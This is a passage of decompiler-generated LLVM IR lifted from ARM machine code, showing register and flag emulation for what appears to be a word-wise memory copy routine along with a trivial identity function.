  %v0_14b28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14b28

dec_label_pc_14b84:                               ; preds = %dec_label_pc_14b78, %dec_label_pc_14b7c.backedge, %dec_label_pc_14b38, %dec_label_pc_14b7c.preheader, %dec_label_pc_14b60
  %v0_14b84 = load i32, i32* @r5, align 4
  %v1_14b84 = load i32, i32* @r7, align 4
  %v3_14b84 = icmp uge i32 %v0_14b84, %v1_14b84
  store i1 %v3_14b84, i1* %cpsr_c.global-to-local, align 1
  %v9_14b84 = icmp eq i32 %v0_14b84, %v1_14b84
  store i1 %v9_14b84, i1* %cpsr_z.global-to-local, align 1
  %v2_14b88 = xor i1 %v9_14b84, true
  %v3_14b88 = and i1 %v3_14b84, %v2_14b88
  br i1 %v3_14b88, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_14b84
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_14b8c = inttoptr i32 %v0_14b84 to i8*
  store i8 0, i8* %v7_14b8c, align 1
  %v0_14b90.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_14b90.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_14b84, %bb
  %v1_14b90 = phi i1 [ %v1_14b90.pre, %bb ], [ %v9_14b84, %dec_label_pc_14b84 ]
  %v0_14b90 = phi i1 [ %v0_14b90.pre, %bb ], [ %v3_14b84, %dec_label_pc_14b84 ]
  %v2_14b90 = xor i1 %v1_14b90, true
  %v3_14b90 = and i1 %v0_14b90, %v2_14b90
  br i1 %v3_14b90, label %.dec_label_pc_14b98_crit_edge, label %dec_label_pc_14b94

.dec_label_pc_14b98_crit_edge:                    ; preds = %.thread14
  %v0_14b98.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14b98

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b08, %dec_label_pc_14b60, %.thread14
  br label %dec_label_pc_14b98

dec_label_pc_14b98:                               ; preds = %.dec_label_pc_14b98_crit_edge, %dec_label_pc_14b94
  %v0_14b98 = phi i32 [ %v0_14b98.pre, %.dec_label_pc_14b98_crit_edge ], [ 0, %dec_label_pc_14b94 ]
  store i32 %v6_14b08, i32* @r5, align 4
  ret i32 %v0_14b98

; uselistorder directives
  uselistorder i1 %v9_14b84, { 1, 0, 2 }
  uselistorder i32 %v1_14b84, { 1, 0 }
  uselistorder i32 %v0_14b84, { 0, 2, 1 }
  uselistorder i32 %v0_14b7c, { 2, 0, 1 }
  uselistorder i32 %v0_14b74, { 1, 0 }
  uselistorder i32 %v3_14b50, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14b40, { 1, 0 }
  uselistorder i32 %v3_14b28, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14b4c, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 (i16*)* @function_149dc, { 3, 0, 1, 2 }
  uselistorder i1 true, { 0, 1, 57, 64, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 55, 31, 32, 33, 34, 35, 36, 58, 37, 38, 39, 56, 40, 41, 42, 43, 44, 65, 66, 67, 68, 59, 69, 70, 71, 72, 73, 74, 75, 49, 50, 76, 51, 52, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 48, 92, 93, 94, 95, 96, 97, 47, 98, 54, 60, 61, 53, 99, 45, 46, 63, 100, 62 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_14b98, { 1, 0 }
  uselistorder label %dec_label_pc_14b94, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_14b84, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_14b28, { 1, 0 }
}

define i32 @function_14ba8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ba8:
  ret i32 %arg1
}

define i32 @function_14bb0() local_unnamed_addr {
dec_label_pc_14bb0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_14bb0 = load i32, i32* @r1, align 4
  %v1_14bb0 = load i32, i32* @r0, align 4
  %v2_14bb0 = sub i32 %v0_14bb0, %v1_14bb0
  %v3_14bb0 = icmp ult i32 %v0_14bb0, %v1_14bb0
  %v4_14bb0 = xor i32 %v1_14bb0, %v0_14bb0
  %v5_14bb0 = xor i32 %v2_14bb0, %v0_14bb0
  %v6_14bb0 = and i32 %v5_14bb0, %v4_14bb0
  %v7_14bb0 = icmp slt i32 %v6_14bb0, 0
  store i1 %v7_14bb0, i1* %cpsr_v.global-to-local, align 1
  %v8_14bb0 = icmp slt i32 %v2_14bb0, 0
  store i1 %v8_14bb0, i1* %cpsr_n.global-to-local, align 1
  %v9_14bb0 = icmp eq i32 %v0_14bb0, %v1_14bb0
  store i1 %v9_14bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14bb0, label %dec_label_pc_14e04, label %dec_label_pc_14bb8

dec_label_pc_14bb8:                               ; preds = %dec_label_pc_14bb0
  br i1 %v9_14bb0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_14bb8
  %merge = phi i32 [ %v0_14bb0, %dec_label_pc_14bb8 ], [ %v2_14e98, %bb150 ], [ %v11_14eb4, %bb153 ], [ %v7_14eb4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_14bb8
  %v5_14bbc = inttoptr i32 %v1_14bb0 to i8*
  store i8* %v5_14bbc, i8** %stack_var_-8, align 4
  %v8_14bbc = load i32, i32* @lr, align 4
  %v0_14bc0 = load i32, i32* @r2, align 4
  %v2_14bc0 = add i32 %v0_14bc0, -4
  store i32 %v2_14bc0, i32* %r2.global-to-local, align 4
  %v4_14bc0 = sub i32 3, %v0_14bc0
  %v5_14bc0 = and i32 %v4_14bc0, %v0_14bc0
  %v6_14bc0 = icmp slt i32 %v5_14bc0, 0
  store i1 %v6_14bc0, i1* %cpsr_v.global-to-local, align 1
  %v7_14bc0 = icmp slt i32 %v2_14bc0, 0
  store i1 %v7_14bc0, i1* %cpsr_n.global-to-local, align 1
  %v8_14bc0 = icmp eq i32 %v0_14bc0, 4
  store i1 %v8_14bc0, i1* %cpsr_z.global-to-local, align 1
  %v5_14bc4 = icmp slt i32 %v0_14bc0, 4
  br i1 %v5_14bc4, label %bb140, label %dec_label_pc_14bc8

dec_label_pc_14bc8:                               ; preds = %bb
  %v1_14bc8 = urem i32 %v1_14bb0, 4
  store i32 %v1_14bc8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14bc8 = icmp eq i32 %v1_14bc8, 0
  store i1 %v2_14bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bc8, label %dec_label_pc_14bd0, label %dec_label_pc_14c7c

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bc8
  %v1_14bd0 = urem i32 %v0_14bb0, 4
  store i32 %v1_14bd0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14bd0 = icmp eq i32 %v1_14bd0, 0
  store i1 %v2_14bd0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_14bb0 to i2
  br i1 %v2_14bd0, label %dec_label_pc_14bd8, label %dec_label_pc_14cac

dec_label_pc_14bd8:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14ca4
  %v0_14bf094 = phi i32 [ %v1_14bb0, %dec_label_pc_14bd0 ], [ %v0_14dcc77, %dec_label_pc_14ca4 ]
  %v0_14bec93 = phi i32 [ %v0_14bb0, %dec_label_pc_14bd0 ], [ %v0_14ca4, %dec_label_pc_14ca4 ]
  %v0_14bd8 = phi i32 [ %v2_14bc0, %dec_label_pc_14bd0 ], [ %v2_14c9c, %dec_label_pc_14ca4 ]
  %v1_14bd8 = add i32 %v0_14bd8, -8
  store i32 %v1_14bd8, i32* %r2.global-to-local, align 4
  %v3_14bd8 = sub i32 7, %v0_14bd8
  %v4_14bd8 = and i32 %v3_14bd8, %v0_14bd8
  %v5_14bd8 = icmp slt i32 %v4_14bd8, 0
  store i1 %v5_14bd8, i1* %cpsr_v.global-to-local, align 1
  %v6_14bd8 = icmp slt i32 %v1_14bd8, 0
  store i1 %v6_14bd8, i1* %cpsr_n.global-to-local, align 1
  %v7_14bd8 = icmp eq i32 %v0_14bd8, 8
  store i1 %v7_14bd8, i1* %cpsr_z.global-to-local, align 1
  %v2_14bdc = xor i1 %v6_14bd8, %v5_14bd8
  br i1 %v2_14bdc, label %dec_label_pc_14c2c, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bd8
  %v1_14be0 = add i32 %v0_14bd8, -28
  store i32 %v1_14be0, i32* %r2.global-to-local, align 4
  %v3_14be0 = sub i32 27, %v0_14bd8
  %v4_14be0 = and i32 %v3_14be0, %v1_14bd8
  %v5_14be0 = icmp slt i32 %v4_14be0, 0
  store i1 %v5_14be0, i1* %cpsr_v.global-to-local, align 1
  %v6_14be0 = icmp slt i32 %v1_14be0, 0
  store i1 %v6_14be0, i1* %cpsr_n.global-to-local, align 1
  %v7_14be0 = icmp eq i32 %v1_14bd8, 20
  store i1 %v7_14be0, i1* %cpsr_z.global-to-local, align 1
  %v2_14be4 = xor i1 %v6_14be0, %v5_14be0
  br i1 %v2_14be4, label %dec_label_pc_14c18, label %dec_label_pc_14be8

dec_label_pc_14be8:                               ; preds = %dec_label_pc_14be0
  %v0_14be8 = load i32, i32* @r4, align 4
  store i32 %v0_14be8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14bec

dec_label_pc_14bec:                               ; preds = %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge, %dec_label_pc_14be8
  %v0_14bf0 = phi i32 [ %v12_14bf8, %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge ], [ %v0_14bf094, %dec_label_pc_14be8 ]
  %v0_14bec = phi i32 [ %v0_14bec.pre, %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge ], [ %v0_14bec93, %dec_label_pc_14be8 ]
  %v1_14bec = inttoptr i32 %v0_14bec to i32*
  %v2_14bec = load i32, i32* %v1_14bec, align 4
  %v3_14bec = add i32 %v0_14bec, 4
  %v4_14bec = inttoptr i32 %v3_14bec to i32*
  %v5_14bec = load i32, i32* %v4_14bec, align 4
  store i32 %v5_14bec, i32* %r4.global-to-local, align 4
  %v6_14bec = add i32 %v0_14bec, 8
  %v7_14bec = inttoptr i32 %v6_14bec to i32*
  %v8_14bec = load i32, i32* %v7_14bec, align 4
  store i32 %v8_14bec, i32* %ip.global-to-local, align 4
  %v9_14bec = add i32 %v0_14bec, 12
  %v10_14bec = inttoptr i32 %v9_14bec to i32*
  %v11_14bec = load i32, i32* %v10_14bec, align 4
  store i32 %v11_14bec, i32* %lr.global-to-local, align 4
  %v12_14bec = add i32 %v0_14bec, 16
  store i32 %v12_14bec, i32* %r1.global-to-local, align 4
  %v1_14bf0 = inttoptr i32 %v0_14bf0 to i32*
  store i32 %v2_14bec, i32* %v1_14bf0, align 4
  %v3_14bf0 = add i32 %v0_14bf0, 4
  %v4_14bf0 = inttoptr i32 %v3_14bf0 to i32*
  %v5_14bf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14bf0, i32* %v4_14bf0, align 4
  %v6_14bf0 = add i32 %v0_14bf0, 8
  %v7_14bf0 = inttoptr i32 %v6_14bf0 to i32*
  %v8_14bf0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_14bf0, i32* %v7_14bf0, align 4
  %v9_14bf0 = add i32 %v0_14bf0, 12
  %v10_14bf0 = inttoptr i32 %v9_14bf0 to i32*
  %v11_14bf0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14bf0, i32* %v10_14bf0, align 4
  %v12_14bf0 = add i32 %v0_14bf0, 16
  store i32 %v12_14bf0, i32* %r0.global-to-local, align 4
  %v0_14bf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14bf4 = inttoptr i32 %v0_14bf4 to i32*
  %v2_14bf4 = load i32, i32* %v1_14bf4, align 4
  store i32 %v2_14bf4, i32* @r3, align 4
  %v3_14bf4 = add i32 %v0_14bf4, 4
  %v4_14bf4 = inttoptr i32 %v3_14bf4 to i32*
  %v5_14bf4 = load i32, i32* %v4_14bf4, align 4
  store i32 %v5_14bf4, i32* %r4.global-to-local, align 4
  %v6_14bf4 = add i32 %v0_14bf4, 8
  %v7_14bf4 = inttoptr i32 %v6_14bf4 to i32*
  %v8_14bf4 = load i32, i32* %v7_14bf4, align 4
  store i32 %v8_14bf4, i32* @ip, align 4
  %v9_14bf4 = add i32 %v0_14bf4, 12
  %v10_14bf4 = inttoptr i32 %v9_14bf4 to i32*
  %v11_14bf4 = load i32, i32* %v10_14bf4, align 4
  store i32 %v11_14bf4, i32* %lr.global-to-local, align 4
  %v12_14bf4 = add i32 %v0_14bf4, 16
  store i32 %v12_14bf4, i32* @r1, align 4
  %v1_14bf8 = inttoptr i32 %v12_14bf0 to i32*
  store i32 %v2_14bf4, i32* %v1_14bf8, align 4
  %v3_14bf8 = add i32 %v0_14bf0, 20
  %v4_14bf8 = inttoptr i32 %v3_14bf8 to i32*
  %v5_14bf8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14bf8, i32* %v4_14bf8, align 4
  %v6_14bf8 = add i32 %v0_14bf0, 24
  %v7_14bf8 = inttoptr i32 %v6_14bf8 to i32*
  %v8_14bf8 = load i32, i32* @ip, align 4
  store i32 %v8_14bf8, i32* %v7_14bf8, align 4
  %v9_14bf8 = add i32 %v0_14bf0, 28
  %v10_14bf8 = inttoptr i32 %v9_14bf8 to i32*
  %v11_14bf8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14bf8, i32* %v10_14bf8, align 4
  %v12_14bf8 = add i32 %v0_14bf0, 32
  store i32 %v12_14bf8, i32* @r0, align 4
  %v0_14bfc = load i32, i32* %r2.global-to-local, align 4
  %v1_14bfc = add i32 %v0_14bfc, -32
  store i32 %v1_14bfc, i32* %r2.global-to-local, align 4
  %v3_14bfc = sub i32 31, %v0_14bfc
  %v4_14bfc = and i32 %v3_14bfc, %v0_14bfc
  %v5_14bfc = icmp slt i32 %v4_14bfc, 0
  %v6_14bfc = icmp slt i32 %v1_14bfc, 0
  %v2_14c00 = xor i1 %v6_14bfc, %v5_14bfc
  br i1 %v2_14c00, label %dec_label_pc_14c04, label %dec_label_pc_14bec.dec_label_pc_14bec_crit_edge

dec_label_pc_14bec.dec_label_pc_14bec_crit_edge:  ; preds = %dec_label_pc_14bec
  %v0_14bec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14bec

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14bec
  %v1_14c04 = add i32 %v0_14bfc, -16
  %v3_14c04 = add i32 %v0_14bfc, 2147483616
  %v4_14c04 = and i32 %v1_14c04, %v3_14c04
  %v5_14c04 = icmp slt i32 %v4_14c04, 0
  store i1 %v5_14c04, i1* %cpsr_v.global-to-local, align 1
  %v6_14c04 = icmp slt i32 %v1_14c04, 0
  store i1 %v6_14c04, i1* %cpsr_n.global-to-local, align 1
  %v7_14c04 = icmp eq i32 %v1_14c04, 0
  store i1 %v7_14c04, i1* %cpsr_z.global-to-local, align 1
  %v2_14c08 = xor i1 %v6_14c04, %v5_14c04
  br i1 %v2_14c08, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_14c04
  %v3_14c08 = load i32, i32* @r1, align 4
  %v4_14c08 = inttoptr i32 %v3_14c08 to i32*
  %v5_14c08 = load i32, i32* %v4_14c08, align 4
  store i32 %v5_14c08, i32* @r3, align 4
  %v6_14c08 = add i32 %v3_14c08, 4
  %v7_14c08 = inttoptr i32 %v6_14c08 to i32*
  %v8_14c08 = load i32, i32* %v7_14c08, align 4
  store i32 %v8_14c08, i32* %r4.global-to-local, align 4
  %v9_14c08 = add i32 %v3_14c08, 8
  %v10_14c08 = inttoptr i32 %v9_14c08 to i32*
  %v11_14c08 = load i32, i32* %v10_14c08, align 4
  store i32 %v11_14c08, i32* @ip, align 4
  %v12_14c08 = add i32 %v3_14c08, 12
  %v13_14c08 = inttoptr i32 %v12_14c08 to i32*
  %v14_14c08 = load i32, i32* %v13_14c08, align 4
  store i32 %v14_14c08, i32* %lr.global-to-local, align 4
  %v15_14c08 = add i32 %v3_14c08, 16
  store i32 %v15_14c08, i32* @r1, align 4
  %v4_14c0c = inttoptr i32 %v12_14bf8 to i32*
  store i32 %v5_14c08, i32* %v4_14c0c, align 4
  %v6_14c0c = add i32 %v0_14bf0, 36
  %v7_14c0c = inttoptr i32 %v6_14c0c to i32*
  %v8_14c0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_14c0c, i32* %v7_14c0c, align 4
  %v9_14c0c = add i32 %v0_14bf0, 40
  %v10_14c0c = inttoptr i32 %v9_14c0c to i32*
  %v11_14c0c = load i32, i32* @ip, align 4
  store i32 %v11_14c0c, i32* %v10_14c0c, align 4
  %v12_14c0c = add i32 %v0_14bf0, 44
  %v13_14c0c = inttoptr i32 %v12_14c0c to i32*
  %v14_14c0c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_14c0c, i32* %v13_14c0c, align 4
  %v15_14c0c = add i32 %v0_14bf0, 48
  store i32 %v15_14c0c, i32* @r0, align 4
  %v3_14c10 = load i32, i32* %r2.global-to-local, align 4
  %v4_14c10 = add i32 %v3_14c10, -16
  store i32 %v4_14c10, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_14c04, %bb136
  %v3_14c20102111 = phi i32 [ %v15_14c0c, %bb136 ], [ %v12_14bf8, %dec_label_pc_14c04 ]
  %v0_14c18.pre = phi i32 [ %v4_14c10, %bb136 ], [ %v1_14bfc, %dec_label_pc_14c04 ]
  %v2_14c14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14c14, i32* @r4, align 4
  br label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %dec_label_pc_14be0, %bb137
  %v3_14c20101 = phi i32 [ %v0_14bf094, %dec_label_pc_14be0 ], [ %v3_14c20102111, %bb137 ]
  %v0_14c18 = phi i32 [ %v1_14be0, %dec_label_pc_14be0 ], [ %v0_14c18.pre, %bb137 ]
  %v1_14c18 = add i32 %v0_14c18, 20
  store i32 %v1_14c18, i32* %r2.global-to-local, align 4
  %v3_14c18 = sub i32 0, %v0_14c18
  %v4_14c18 = and i32 %v1_14c18, %v3_14c18
  %v5_14c18 = icmp slt i32 %v4_14c18, 0
  store i1 %v5_14c18, i1* %cpsr_v.global-to-local, align 1
  %v6_14c18 = icmp slt i32 %v1_14c18, 0
  store i1 %v6_14c18, i1* %cpsr_n.global-to-local, align 1
  %v7_14c18 = icmp eq i32 %v1_14c18, 0
  store i1 %v7_14c18, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %.thread115, %dec_label_pc_14c18
  %v0_14c2c.pre157 = phi i32 [ %v0_14c2c.pre, %.thread115 ], [ %v1_14c18, %dec_label_pc_14c18 ]
  %v3_14c20 = phi i32 [ %v3_14c2099116, %.thread115 ], [ %v3_14c20101, %dec_label_pc_14c18 ]
  %v1_14c24 = phi i1 [ %v1_14c28, %.thread115 ], [ %v5_14c18, %dec_label_pc_14c18 ]
  %v0_14c24 = phi i1 [ %v0_14c28, %.thread115 ], [ %v6_14c18, %dec_label_pc_14c18 ]
  %v2_14c1c = xor i1 %v1_14c24, %v0_14c24
  br i1 %v2_14c1c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_14c1c
  %v3_14c1c = load i32, i32* @r1, align 4
  %v4_14c1c = inttoptr i32 %v3_14c1c to i32*
  %v5_14c1c = load i32, i32* %v4_14c1c, align 4
  store i32 %v5_14c1c, i32* @r3, align 4
  %v6_14c1c = add i32 %v3_14c1c, 4
  %v7_14c1c = inttoptr i32 %v6_14c1c to i32*
  %v8_14c1c = load i32, i32* %v7_14c1c, align 4
  store i32 %v8_14c1c, i32* @ip, align 4
  %v9_14c1c = add i32 %v3_14c1c, 8
  %v10_14c1c = inttoptr i32 %v9_14c1c to i32*
  %v11_14c1c = load i32, i32* %v10_14c1c, align 4
  store i32 %v11_14c1c, i32* %lr.global-to-local, align 4
  %v12_14c1c = add i32 %v3_14c1c, 12
  store i32 %v12_14c1c, i32* @r1, align 4
  %v4_14c20 = inttoptr i32 %v3_14c20 to i32*
  store i32 %v5_14c1c, i32* %v4_14c20, align 4
  %v6_14c20 = add i32 %v3_14c20, 4
  %v7_14c20 = inttoptr i32 %v6_14c20 to i32*
  %v8_14c20 = load i32, i32* @ip, align 4
  store i32 %v8_14c20, i32* %v7_14c20, align 4
  %v9_14c20 = add i32 %v3_14c20, 8
  %v10_14c20 = inttoptr i32 %v9_14c20 to i32*
  %v11_14c20 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14c20, i32* %v10_14c20, align 4
  %v12_14c20 = add i32 %v3_14c20, 12
  store i32 %v12_14c20, i32* @r0, align 4
  %v3_14c24 = load i32, i32* %r2.global-to-local, align 4
  %v4_14c24 = add i32 %v3_14c24, -12
  store i32 %v4_14c24, i32* %r2.global-to-local, align 4
  %v6_14c24 = sub i32 11, %v3_14c24
  %v7_14c24 = and i32 %v6_14c24, %v3_14c24
  %v8_14c24 = icmp slt i32 %v7_14c24, 0
  store i1 %v8_14c24, i1* %cpsr_v.global-to-local, align 1
  %v9_14c24 = icmp slt i32 %v4_14c24, 0
  store i1 %v9_14c24, i1* %cpsr_n.global-to-local, align 1
  %v10_14c24 = icmp eq i32 %v3_14c24, 12
  store i1 %v10_14c24, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_14c1c, %bb138
  %v0_14c2c.pre = phi i32 [ %v4_14c24, %bb138 ], [ %v0_14c2c.pre157, %dec_label_pc_14c1c ]
  %v3_14c2099116 = phi i32 [ %v12_14c20, %bb138 ], [ %v3_14c20, %dec_label_pc_14c1c ]
  %v1_14c28 = phi i1 [ %v8_14c24, %bb138 ], [ %v1_14c24, %dec_label_pc_14c1c ]
  %v0_14c28 = phi i1 [ %v9_14c24, %bb138 ], [ %v0_14c24, %dec_label_pc_14c1c ]
  %v2_14c28 = xor i1 %v1_14c28, %v0_14c28
  br i1 %v2_14c28, label %dec_label_pc_14c2c, label %dec_label_pc_14c1c

dec_label_pc_14c2c:                               ; preds = %.thread115, %dec_label_pc_14bd8
  %v4_14c3c = phi i32 [ %v0_14bf094, %dec_label_pc_14bd8 ], [ %v3_14c2099116, %.thread115 ]
  %v0_14c2c = phi i32 [ %v1_14bd8, %dec_label_pc_14bd8 ], [ %v0_14c2c.pre, %.thread115 ]
  %v1_14c2c = add i32 %v0_14c2c, 8
  store i32 %v1_14c2c, i32* %r2.global-to-local, align 4
  %v3_14c2c = sub i32 0, %v0_14c2c
  %v4_14c2c = and i32 %v1_14c2c, %v3_14c2c
  %v5_14c2c = icmp slt i32 %v4_14c2c, 0
  store i1 %v5_14c2c, i1* %cpsr_v.global-to-local, align 1
  %v6_14c2c = icmp slt i32 %v1_14c2c, 0
  store i1 %v6_14c2c, i1* %cpsr_n.global-to-local, align 1
  %v7_14c2c = icmp eq i32 %v1_14c2c, 0
  store i1 %v7_14c2c, i1* %cpsr_z.global-to-local, align 1
  %v2_14c30 = xor i1 %v6_14c2c, %v5_14c2c
  br i1 %v2_14c30, label %bb140, label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14c2c
  %v1_14c34 = add i32 %v0_14c2c, 4
  store i32 %v1_14c34, i32* %r2.global-to-local, align 4
  %v3_14c34 = sub i32 -5, %v0_14c2c
  %v4_14c34 = and i32 %v3_14c34, %v1_14c2c
  %v5_14c34 = icmp slt i32 %v4_14c34, 0
  store i1 %v5_14c34, i1* %cpsr_v.global-to-local, align 1
  %v6_14c34 = icmp slt i32 %v1_14c34, 0
  store i1 %v6_14c34, i1* %cpsr_n.global-to-local, align 1
  %v7_14c34 = icmp eq i32 %v1_14c2c, 4
  store i1 %v7_14c34, i1* %cpsr_z.global-to-local, align 1
  %v2_14c38 = xor i1 %v6_14c34, %v5_14c34
  %v3_14c38 = load i32, i32* @r1, align 4
  %v4_14c38 = inttoptr i32 %v3_14c38 to i32*
  %v5_14c38 = load i32, i32* %v4_14c38, align 4
  store i32 %v5_14c38, i32* @r3, align 4
  %v7_14c38 = add i32 %v3_14c38, 4
  br i1 %v2_14c38, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_14c34
  store i32 %v7_14c38, i32* @r1, align 4
  %v5_14c3c = inttoptr i32 %v4_14c3c to i32*
  store i32 %v5_14c38, i32* %v5_14c3c, align 4
  %v6_14c3c = load i32, i32* @r0, align 4
  %v7_14c3c = add i32 %v6_14c3c, 4
  store i32 %v7_14c3c, i32* @r0, align 4
  %v0_14c4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_14c34
  %v7_14c40 = inttoptr i32 %v7_14c38 to i32*
  %v8_14c40 = load i32, i32* %v7_14c40, align 4
  store i32 %v8_14c40, i32* @ip, align 4
  %v9_14c40 = add i32 %v3_14c38, 8
  store i32 %v9_14c40, i32* @r1, align 4
  %v4_14c44 = inttoptr i32 %v4_14c3c to i32*
  store i32 %v5_14c38, i32* %v4_14c44, align 4
  %v6_14c44 = add i32 %v4_14c3c, 4
  %v7_14c44 = inttoptr i32 %v6_14c44 to i32*
  %v8_14c44 = load i32, i32* @ip, align 4
  store i32 %v8_14c44, i32* %v7_14c44, align 4
  %v9_14c44 = add i32 %v4_14c3c, 8
  store i32 %v9_14c44, i32* @r0, align 4
  %v3_14c48 = load i32, i32* %r2.global-to-local, align 4
  %v4_14c48 = add i32 %v3_14c48, -4
  store i32 %v4_14c48, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_14c2c, %bb, %dec_label_pc_14dfc, %dec_label_pc_14d90, %dec_label_pc_14d24, %bb139
  %v0_14c4c = phi i32 [ %v0_14c4c.pre, %.thread122 ], [ %v2_14c9c, %.thread128 ], [ %v1_14c2c, %dec_label_pc_14c2c ], [ %v2_14bc0, %bb ], [ %v0_14c4c61, %dec_label_pc_14dfc ], [ %v0_14c4c60, %dec_label_pc_14d90 ], [ %v0_14c4c59, %dec_label_pc_14d24 ], [ %v4_14c48, %bb139 ]
  %v1_14c4c = add i32 %v0_14c4c, 4
  store i32 %v1_14c4c, i32* %r2.global-to-local, align 4
  %v3_14c4c = sub i32 0, %v0_14c4c
  %v4_14c4c = and i32 %v1_14c4c, %v3_14c4c
  %v5_14c4c = icmp slt i32 %v4_14c4c, 0
  store i1 %v5_14c4c, i1* %cpsr_v.global-to-local, align 1
  %v6_14c4c = icmp slt i32 %v1_14c4c, 0
  store i1 %v6_14c4c, i1* %cpsr_n.global-to-local, align 1
  %v7_14c4c = icmp eq i32 %v1_14c4c, 0
  store i1 %v7_14c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14c4c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_14c54.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_14c50 = load i8*, i8** %stack_var_-8, align 4
  %v4_14c50 = ptrtoint i8* %v3_14c50 to i32
  store i32 %v4_14c50, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_14c54 = phi i32 [ %v0_14c54.pre, %bb140.bb142_crit_edge ], [ %v8_14bbc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_14c4c, i32 %v0_14c54)
  %v0_14c58 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c58 = add i32 %v0_14c58, -2
  %v3_14c58 = sub i32 1, %v0_14c58
  %v4_14c58 = and i32 %v3_14c58, %v0_14c58
  %v5_14c58 = icmp slt i32 %v4_14c58, 0
  store i1 %v5_14c58, i1* %cpsr_v.global-to-local, align 1
  %v6_14c58 = icmp slt i32 %v1_14c58, 0
  store i1 %v6_14c58, i1* %cpsr_n.global-to-local, align 1
  %v7_14c58 = icmp eq i32 %v0_14c58, 2
  store i1 %v7_14c58, i1* %cpsr_z.global-to-local, align 1
  %v0_14c5c = load i32, i32* @r1, align 4
  %v1_14c5c = inttoptr i32 %v0_14c5c to i8*
  %v2_14c5c = load i8, i8* %v1_14c5c, align 1
  %v5_14c5c = add i32 %v0_14c5c, 1
